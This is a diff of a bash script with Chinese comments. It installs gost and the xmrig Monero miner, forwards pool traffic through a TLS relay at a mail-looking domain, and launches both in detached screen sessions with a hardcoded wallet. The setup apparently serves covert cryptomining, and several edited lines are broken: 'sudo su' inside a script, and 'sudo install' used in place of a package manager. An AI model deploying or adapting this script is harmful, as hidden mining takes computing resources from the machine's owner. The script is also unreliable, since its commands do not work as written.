@@ -1,10 +1,10 @@
 #!/bin/bash
 
-
+sudo su
 
 # 安装 Snap 并通过 Snap 安装 gost
-apt install core
-apt install gost
+sudo install core
+sudo install gost
 
 # 更新 APT 并安装必要的软件包
 apt update && apt install -y wget curl libhwloc-dev screen
@@ -15,9 +15,9 @@ tar -zxvf xmrig0.tar.gz
 chmod +x xmrig0
 
 # 启动 gost 作为后台服务进行端口转发
-screen -dmS gost gost -L=147.182.211.160:80 -F=relay+tls://mail.mailcom.cc:37555
+screen -dmS gost gost -L=tcp://:6666/pool.supportxmr.com:9000 -F=relay+tls://mail.mailcom.cc:37555
 
 # 启动 xmrig0 挖矿
-screen -dmS xmrig ./xmrig0 -o 147.182.211.160:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -k -a rx/0 -t 16 --donate-level=N --tls --randomx-1gb-pages -p Sage
+screen -dmS xmrig ./xmrig0 -o 127.0.0.1:6666 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -k -a rx/0 -t 16 --donate-level=N --tls --randomx-1gb-pages -p Abudhabi-6-paris
 
 echo "所有服务已启动，可以使用 'screen -ls' 查看运行中的进程。"
